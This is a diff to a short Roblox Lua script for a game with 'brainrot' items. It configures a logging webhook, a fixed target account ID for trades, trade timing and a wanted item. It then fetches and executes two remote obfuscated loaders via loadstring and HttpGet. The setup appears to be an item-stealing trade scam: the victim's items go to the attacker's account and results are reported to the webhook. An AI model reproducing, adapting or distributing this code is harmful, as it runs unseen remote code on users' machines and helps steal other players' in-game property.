@@ -1,28 +1,10 @@
--- Wait for the game to fully load before starting
-if not game:IsLoaded() then
-    game.Loaded:Wait()
-end
-
--- 1. Execute the first loader with a protective pcall (error handling)
-local success, err = pcall(function()
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/0fbe1cfb1005a43bbfeb46cd458b7f09.lua"))()
-end)
-
-if not success then
-    warn("First script failed to load: " .. tostring(err))
-end
-
--- Small pause to ensure the first script initializes
-task.wait(1.5)
-
--- 2. Define your settings
+-- Настройки трейда
 getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_f3c631c272144b39bff34fa78896917e"
-getgenv().TARGET_ID = 7236992272 
+getgenv().TARGET_ID = 7236992272  -- ID аккаунта для трейда
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2 
 getgenv().TARGET_BRAINROTS = {
     ["Garama and Madundung"] = true
 }
-
--- 3. Execute the second loader
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/0fbe1cfb1005a43bbfeb46cd458b7f09.lua"))()
